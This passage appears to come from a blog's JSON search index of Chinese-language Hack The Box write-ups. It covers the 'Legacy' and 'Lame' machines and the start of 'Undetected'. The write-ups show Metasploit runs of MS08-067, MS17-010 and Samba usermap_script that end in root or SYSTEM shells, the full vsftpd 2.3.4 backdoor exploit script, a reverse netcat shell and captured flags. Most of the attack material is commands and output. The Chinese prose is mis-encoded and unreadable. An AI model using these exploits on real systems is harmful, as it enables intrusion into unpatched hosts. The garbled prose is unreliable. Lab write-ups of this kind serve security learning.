LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n```\nä½¿ç”¨æŒ‡å®šçš„expå¹¶è®¾ç½®å¥½é…ç½®ä¿¡æ¯åï¼Œè¾“å…¥exploitæ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/smb/ms08_067_netapi) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] 10.10.10.4:445 - Automatically detecting the target...\n[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...\n[*] Sending stage (175174 bytes) to 10.10.10.4\n[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.10.10.4:1032) at 2022-03-02 00:21:27 -0500\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : LEGACY\nOS              : Windows XP (5.1 Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : HTB\nLogged On Users : 1\nMeterpreter     : x86/windows\n```\næˆåŠŸè·å¾—systemæƒé™\n\n### MS17-010\nè®¾ç½®å¥½é…ç½®åè¾“å…¥exploitæ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_psexec) > show options \n\nModule options (exploit/windows/smb/ms17_010_psexec):\n\n   Name                  Current Setting                                                 Required  Description\n   ----                  ---------------                                                 --------  -----------\n   DBGTRACE              false                                                           yes       Show extra debug trace info\n   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction\n   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)\n   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check\n   RHOSTS                10.10.10.4                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT                 445                                                             yes       The Target port (TCP)\n   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing\n   SERVICE_DISPLAY_NAME                                                                  no        The service display name\n   SERVICE_NAME                                                                          no        The service name\n   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\n   SMBDomain             .                                                               no        The Windows domain to use for authentication\n   SMBPass                                                                               no        The password for the specified username\n   SMBUser                                                                               no        The username to authenticate as\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\næ‰§è¡ŒæˆåŠŸ\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_psexec) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] 10.10.10.4:445 - Target OS: Windows 5.1\n[*] 10.10.10.4:445 - Filling barrel with fish... done\n[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->\n[*] 10.10.10.4:445 -    [*] Preparing dynamite...\n[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!\n[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!\n[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel\n[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->\n[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81abb3c8\n[*] 10.10.10.4:445 - Built a write-what-where primitive...\n[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!\n[*] 10.10.10.4:445 - Selecting native target\n[*] 10.10.10.4:445 - Uploading payload... uercgOUf.exe\n[*] 10.10.10.4:445 - Created \\uercgOUf.exe...\n[+] 10.10.10.4:445 - Service started successfully...\n[*] Sending stage (175174 bytes) to 10.10.10.4\n[*] 10.10.10.4:445 - Deleting \\uercgOUf.exe...\n[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.4:1033) at 2022-03-02 00:31:20 -0500\n```\næŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯å’Œæƒé™\n\n```bash\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : LEGACY\nOS              : Windows XP (5.1 Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : HTB\nLogged On Users : 1\nMeterpreter     : x86/windows\n```\n## Flag\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Documents and Settings\\john\\Desktop\\user.txt (32 bytes)\nmeterpreter > cat 'c:\\Documents and Settings\\john\\Desktop\\user.txt'\ne69af0e4f443de7e36876fda4ec7644f\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat \"c:\\Documents and Settings\\Administrator\\Desktop\\root.txt\"\n993442d258b0e0ec917cae9e695d5713\nmeterpreter >\n```\næŸ¥æ‰¾å¹¶æˆåŠŸæ‹¿åˆ°flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Lame - Hackthebox","url":"/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/","content":"\n# Hackthebox - Lame\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Lame/64e0a668-9ebf-4cfc-8c43-522c03c10081.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Lame/d4ae2982-a13e-445c-b71e-58c3770f1589.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 00:25 EST\nNmap scan report for 10.10.10.3\nHost is up (0.51s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.16.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h30m20s, deviation: 3h32m12s, median: 17s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2022-03-01T00:26:29-05:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)                                                                                                                                                              \n|_smb2-time: Protocol negotiation failed (SMB2)                                                                                                                                                                     \n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   503.51 ms 10.10.16.1\n2   503.58 ms 10.10.10.3\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 101.36 seconds\n```\n## æ¼æ´åˆ©ç”¨\n### Ftp\nè¿™è¾¹FTPçš„ç‰ˆæœ¬æ˜¯vsftpd 2.3.4ï¼Œæˆ‘å¯»æ€å¯èƒ½æœ‰æ¼æ´ï¼Œå»æœç´¢ä¸€ä¸‹çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit vsftpd 2.3.4\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                         | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                            | unix/remote/17491.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™é‡Œæœ‰ä¸¤ä¸ªåé—¨æ¼æ´æ‰§è¡Œï¼Œå…¶ä¸­ä¸€ä¸ªè¿˜æ˜¯msfçš„ï¼Œå»åˆ©ç”¨çœ‹çœ‹\n\n### Metasploit\n```bash\nmsf6 > search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n```\nå’±ä»¬ä½¿ç”¨å®ƒæ¥åˆ©ç”¨æ¼æ´\n\n```bash\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options \n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   21               yes       The target port (TCP)\n\nPayload options (cmd/unix/interact):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3\nrhosts => 10.10.10.3\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit \n\n[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.10.3:21 - USER: 331 Please specify the password.\nwhoami\n[*] Exploit completed, but no session was created.\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > whoami\n[*] exec: whoami\n\nroot\n```\nè¿™è¾¹ç¡®å®æ‰§è¡ŒæˆåŠŸäº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰è·å¾—ä¸€ä¸ªå¯ç”¨çš„shellï¼Œè¿™å¹¶ä¸ç¬¦åˆæˆ‘ä»¬çš„ç›®çš„ï¼Œè€Œä¸”æˆ‘çš„åŸåˆ™ä¸€å‘æ˜¯èƒ½ä¸ä½¿ç”¨msfå°±ä¸ä½¿ç”¨\n\næˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ä¸ªæ¼æ´\n\n### Exploit\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit vsftpd 2.3.4\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                         | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                            | unix/remote/17491.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# locate unix/remote/49757.py\n/usr/share/exploitdb/exploits/unix/remote/49757.py\n\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~/Desktop/Exploit.py\n```\nç»™å¤åˆ¶åˆ°æ¡Œé¢ï¼Œç„¶åæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹\n\n```python\n# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution\n# Date: 9-04-2021\n# Exploit Author: HerculesRD\n# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html\n# Version: vsftpd 2.3.4\n# Tested on: debian\n# CVE : CVE-2011-2523\n\n#!/usr/bin/python3   \n\nfrom telnetlib import Telnet \nimport argparse\nfrom signal import signal, SIGINT\nfrom sys import exit\n\ndef handler(signal_received, frame):\n    # Handle any cleanup here\n    print('   [+]Exiting...')\n    exit(0)\n\nsignal(SIGINT, handler)                           \nparser=argparse.ArgumentParser()        \nparser.add_argument(\"host\", help=\"input the address of the vulnerable host\", type=str)\nargs = parser.parse_args()       \nhost = args.host                        \nportFTP = 21 #if necessary edit this line\n\nuser=\"USER nergal:)\"\npassword=\"PASS pass\"\n\ntn=Telnet(host, portFTP)\ntn.read_until(b\"(vsFTPd 2.3.4)\") #if necessary, edit this line\ntn.write(user.encode('ascii') + b\"\\n\")\ntn.read_until(b\"password.\") #if necessary, edit this line\ntn.write(password.encode('ascii') + b\"\\n\")\n\ntn2=Telnet(host, 6200)\nprint('Success, shell opened')\nprint('Send `exit` to quit shell')\ntn2.interact()\n```\nè¿™è¾¹æˆ‘å°è¯•åˆ©ç”¨åï¼Œå‘ç°åˆ©ç”¨å¤±è´¥äº†\n\næ¢ä¸ªå…¶ä»–æ€è·¯çœ‹çœ‹\n\n### Samba\n```php\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Lame]\nâ””â”€# searchsploit Samba 3.0.20       \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nSamba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                            | multiple/remote/10095.txt\nSamba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                  | unix/remote/16320.rb\nSamba < 3.0.20 - Remote Heap Overflow                                                                                                                                             | linux/remote/7701.txt\nSamba < 3.0.20 - Remote Heap Overflow                                                                                                                                             | linux/remote/7701.txt\nSamba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                     | linux_x86/dos/36741.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™è¾¹ä¹Ÿæ˜¯æœ‰ä¸€ä¸ªmsfçš„è„šæœ¬ï¼Œå…ˆç”¨ç”¨çœ‹å§\n\nä½¿ç”¨msfconsoleå¯åŠ¨msf\n\n```php\nmsf6 > search Samba 3.0.20 \n\nMatching Modules\n================\n\n   #  Name                                Disclosure Date  Rank       Check  Description\n   -  ----                                ---------------  ----       -----  -----------\n   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba \"username map script\" Command Execution\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script\n\nmsf6 > use 0\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf6 exploit(multi/samba/usermap_script) > use exploit/multi/samba/usermap_script\n[*] Using configured payload cmd/unix/reverse_netcat\n```\nç„¶åæŸ¥çœ‹ä¸€ä¸‹éœ€è¦ä¿®æ”¹å“ªäº›é…ç½®\n\n```php\nmsf6 exploit(multi/samba/usermap_script) > options \n\nModule options (exploit/multi/samba/usermap_script):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   139              yes       The target port (TCP)\n\nPayload options (cmd/unix/reverse_netcat):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.200.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\nç„¶åå’±ä»¬å¼€å§‹ä¿®æ”¹\n\n```php\nmsf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3\nrhosts => 10.10.10.3\nmsf6 exploit(multi/samba/usermap_script) > set rport 445\nrport => 445\nmsf6 exploit(multi/samba/usermap_script) > set lhost 10.10.16.2\nlhost => 10.10.16.2\n```\nç„¶åå¼€å§‹åˆ©ç”¨\n\n```php\nmsf6 exploit(multi/samba/usermap_script) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.3:45192) at 2022-03-01 01:05:18 -0500\n\nwhoami\nroot\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™\n\nç„¶åè¾“å…¥shellè¿›å…¥shellæ§åˆ¶æ¨¡å¼\n\n```php\nroot@lame:/# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root)\n```\n```php\nroot@lame:/home/makis# cat user.txt\ncat user.txt\n7547181b7a57b001cf0ba3f497b5e8b0\n```\nåœ¨/home/makis/user.txtä¸­æ‰¾åˆ°äº†useræƒé™çš„flagæ–‡ä»¶\n\n```php\nroot@lame:/home/makis# cd /root\ncd /root\nroot@lame:/root# ls\nls\nDesktop  reset_logs.sh  root.txt  vnc.log\nroot@lame:/root# cat root.txt\ncat root.txt\na07cd9e7c60b75852e396c4320f5fae4\n```\nåœ¨/root/root.txtä¸­æ‰¾åˆ°äº†rootæƒé™çš„flag\n\n## å…¶ä»–æ€è·¯\nåŸºäºå¯ä»¥ä¸ç”¨è‡ªåŠ¨åŒ–å·¥å…·å°±ä¸ç”¨çš„åŸåˆ™ï¼Œå’±ä»¬è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªpythonçš„åˆ©ç”¨å·¥å…·\n\n> [https://github.com/ozuma/CVE-2007-2447](https://github.com/ozuma/CVE-2007-2447)\n\né¦–å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\nç„¶åè¿›è¡Œåˆ©ç”¨\n\n```php\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Lame]\nâ””â”€# python3 Exploit.py 10.10.10.3 445 10.10.16.2 4444\n```\næ ¼å¼åˆ†åˆ«æ˜¯python3 åˆ©ç”¨å·¥å…· é¶æœºIP é¶æœºç«¯å£ æœ¬åœ°IP æœ¬åœ°ç«¯å£\n\n```php\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 43672\npython -c \"import pty;pty.spawn('/bin/bash')\"\nroot@lame:/# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root)\n```\nè¿™æ ·åœ¨ä¸ä½¿ç”¨msfçš„æƒ…å†µä¸‹ï¼Œä¹ŸæˆåŠŸæ‹¿åˆ°äº†rootæƒé™","tags":["Hackthebox"]},{"title":"Undetected - Hackthebox","url":"/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/","content":"\n# Hackthebox - Undetected\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Undetected/1e25e841-82de-4cf8-8454-30c628f3334c.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Undetected/c13bdf59-bb66-444b-b145-555f89b6c9d9.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 21:25 EST\nNmap scan report for 10.10.11.146\nHost is up (0.23s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)\n| ssh-hostkey: \n|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)\n|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)\n|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Diana's Jewelry\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/24%OT=22%CT=1%CU=42918%PV=Y%DS=2%DC=T%G=Y%TM=62183E4\nOS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=C)SEQ\nOS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505\nOS:ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=\nOS:M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=\nOS:Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q\nOS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%\nOS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD\nOS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL\nOS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   222.46 ms 10.10.14.1\n2   222.61 ms 10.10.11.146\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.48 seconds\n```\nnmapæ‰«æååªçœ‹åˆ°22å’Œ80ï¼Œé‚£å°±å»çœ‹çœ‹80ç«¯å£å§\n\n### Http\n![](Hackthebox-Undetected/86027939-0731-489d-935c-d16b463ca98c.png)\n\nè¿™çœ‹ç€åƒæ˜¯ä¸€å®¶ç å®åº—çš„å®˜ç½‘ï¼Œå…ˆåœ¨ç½‘ç«™ä¸Šåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰å•¥å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿å§\n\nç‚¹å‡»STOREä¼šè·³è½¬åˆ°store.djewelry.htbï¼ŒåŠ å…¥hostså†çœ‹çœ‹\n\n```bash\necho 10.10.11.146 djewelry.htb store.djewelry.htb >> /etc/hosts\n```\n![](Hackthebox-Undetected/654e0785-e6e1-4e68-bc54-0eaf211df8c4.png)\n\nè¿›æ¥ä»¥åæ˜¯ä¸€ä¸ªå•†åŸé¡µé¢ï¼Œåˆ°å¤„çœ‹çœ‹åŠŸèƒ½ç‚¹\n\n![](Hackthebox-Undetected/2461efa9-d2e5-4087-9d6a-c204719d124e.png)\n\nè¿™é‡Œæç¤ºç½‘ç«™å·²æ¬è¿ï¼Œå»åšä¸ªFUZZçœ‹çœ‹\n\n### Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://store.djewelry.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://store.djewelry.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\njs                      [Status: 301, Size: 321, Words: 20, Lines: 10]\nimages                  [Status: 301, Size: 325, Words: 20, Lines: 10]\ncss                     [Status: 301, Size: 322, Words: 20, Lines: 10]\nfonts                   [Status: 301, Size: 324, Words: 20, Lines: 10]\nvendor                  [Status: 301, Size: 325, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 283, Words: 20, Lines: 10]\n                        [Status: 200, Size: 6215, Words: 528, Lines: 196]\n:: Progress: [20116/20116] :: Job [1/1] :: 106 req/sec :: Duration: [0:03:03] :: Errors: 0 ::\n```\næŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Undetected/2042b883-e106-40d4-8a66-80c327edc8cd.png)\n\nåœ¨vendoré‡Œæœ‰ä¸å°‘ä¸œè¥¿ï¼Œæœ‰ç‚¹æ„æ€\n\n![](Hackthebox-Undetected/9f9d4342-d311-4a93-bd1a-d3362669c6a6.png)\n\n/vendor/phpunit/phpunit/\n\nåœ¨è¿™ä¸ªè·¯å¾„ä¸­å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ›´æ–°è®°å½•ï¼Œæœ€åä¸€ä¸ªç‰ˆæœ¬æ˜¯5.6ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ChangeLog-5.6.md\n\n```bash\n# Changes in PHPUnit 5.6\n\nAll notable changes of the PHPUnit 5.6 release series are documented in this file using the [Keep a CHANGELOG](http://keepachangelog.com/) principles.\n\n## [5.6.2] - 2016-10-25\n\nNew PHAR release due to updated dependencies\n\n## [5.6.1] - 2016-10-07\n\n### Fixed\n\n* Fixed [#2320](https://github.com/sebastianbergmann/phpunit/issues/2320): Conflict between `PHPUnit_Framework_TestCase::getDataSet()` and `PHPUnit_Extensions_Database_TestCase::getDataSet()`\n\n## [5.6.0] - 2016-10-07\n\n### Added\n\n* Merged [#2240](https://github.com/sebastianbergmann/phpunit/pull/2240): Provide access to a test case's data set (for use in `setUp()`, for instance)\n* Merged [#2262](https://github.com/sebastianbergmann/phpunit/pull/2262): Add the `PHPUnit_Framework_Constraint_DirectoryExists`, `PHPUnit_Framework_Constraint_IsReadable`, and `PHPUnit_Framework_Constraint_IsWritable` constraints as well as the `assertIsReadable()`, `assertNotIsReadable()`, `assertIsWritable()`, `assertNotIsWritable()`, `assertDirectoryExists()`, `assertDirectoryNotExists()`, `assertDirectoryIsReadable()`, `assertDirectoryNotIsReadable()`, `assertDirectoryIsWritable()`, `assertDirectoryNotIsWritable()`, `assertFileIsReadable()`, `assertFileNotIsReadable()`, `assertFileIsWritable()`, and `assertFileNotIsWritable()` assertions\n* Added `PHPUnit\\Framework\\TestCase::createConfiguredMock()` based on [idea](https://twitter.com/kriswallsmith/status/763550169090625536) by Kris Wallsmith\n* Added the `@doesNotPerformAssertions` annotation for excluding a test from the \"useless test\" risky test check\n\n### Changed\n\n* Deprecated `PHPUnit\\Framework\\TestCase::setExpectedExceptionRegExp()`\n* `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy`\n\n[5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2\n[5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1\n[5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0\n```\nè¿™è¾¹ç»™å‡ºäº†ä¸€ä¸ªæ›´æ–°æ—¶é—´ï¼Œæœ€åä¸€æ¬¡æ˜¯åœ¨2016-10-25ï¼Œé‚£å’±ä»¬çœ‹çœ‹PHPUnitåœ¨è¿™ä¸ªæ—¶é—´ä¹‹åçš„æ¼æ´å°±å¯ä»¥äº†\n\n![](Hackthebox-Undetected/ce64892a-f0de-434a-bc7f-7116b64abb57.png)\n\nè¿™è¾¹æœç´¢åå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªCVE-2017-9841æ˜¯ç¬¦åˆæˆ‘ä»¬çš„æ¡ä»¶çš„\n\n## æ¼æ´åˆ©ç”¨\n### 